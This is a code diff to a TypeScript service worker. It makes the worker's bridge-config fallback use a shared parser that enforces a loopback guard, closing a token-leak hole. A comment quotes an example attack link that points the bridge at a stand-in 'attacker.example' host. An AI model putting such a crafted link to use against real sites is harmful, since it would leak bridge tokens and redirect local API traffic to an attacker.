@@ -18,7 +18,10 @@
  * (see `boot/setup-sw-registration.ts`); the SW caches it in a module
  * variable. On a cache miss (e.g. SW evicted then restarted by the
  * browser, message lost), the SW falls back to parsing `bridge` /
- * `bridgeToken` from the controlling client's URL.
+ * `bridgeToken` from the controlling client's URL — via the shared
+ * `parseBridgeLaunchParams`, so the same loopback guard applies as in the
+ * page realm and an attacker-suppliable non-loopback `bridge` cannot aim the
+ * local `/api` surface at a remote host on this fallback path (#2939 / #2963).
  */
 
 import type { FetchProxyRequestMsg } from '@slicc/shared-ts';
@@ -27,11 +30,7 @@ import {
   LEADER_RUNTIME_QUERY_NAME,
   LEADER_RUNTIME_QUERY_VALUE,
 } from '../kernel/messages.js';
-import {
-  BRIDGE_TOKEN_QUERY_PARAM,
-  BRIDGE_WS_QUERY_PARAM,
-  deriveBridgeApiBaseUrl,
-} from './boot/bridge-launch-params.js';
+import { parseBridgeLaunchParams } from './boot/bridge-launch-params.js';
 
 /** `postMessage` type tag used by the page → SW config push. */
 export const SW_BRIDGE_CONFIG_MESSAGE = 'slicc:bridge-config';
@@ -75,12 +74,19 @@ export function resolveBridgeConfig(
   } catch {
     return null;
   }
-  const wsUrl = parsed.searchParams.get(BRIDGE_WS_QUERY_PARAM);
-  const token = parsed.searchParams.get(BRIDGE_TOKEN_QUERY_PARAM);
-  if (!wsUrl || !token) return null;
-  const apiBaseUrl = deriveBridgeApiBaseUrl(wsUrl);
-  if (!apiBaseUrl) return null;
-  return { apiBaseUrl: apiBaseUrl.replace(/\/+$/, ''), token };
+  // Delegate to the page-realm launch-param parser so the SW's fallback path
+  // enforces the SAME loopback guard the page does (#2939 P1 / #2963). The
+  // `bridge` query param is attacker-suppliable on a hosted-origin page and
+  // `apiBaseUrl` is derived straight from its host, so a crafted link like
+  // `https://www.sliccy.ai/?bridge=wss://attacker.example/cdp&bridgeToken=x`
+  // must degrade to the no-bridge path HERE exactly as it does in the page
+  // realm — otherwise routing an intercepted fetch through the SW's cache-miss
+  // fallback would aim the local `/api` surface (and leak the bridge token) at
+  // an attacker-controlled origin. Reusing the one parser keeps a single
+  // loopback-guarded contract instead of a re-implemented copy that can drift.
+  const params = parseBridgeLaunchParams(parsed.search);
+  if (!params?.apiBaseUrl) return null;
+  return { apiBaseUrl: params.apiBaseUrl.replace(/\/+$/, ''), token: params.token };
 }
 
 /**
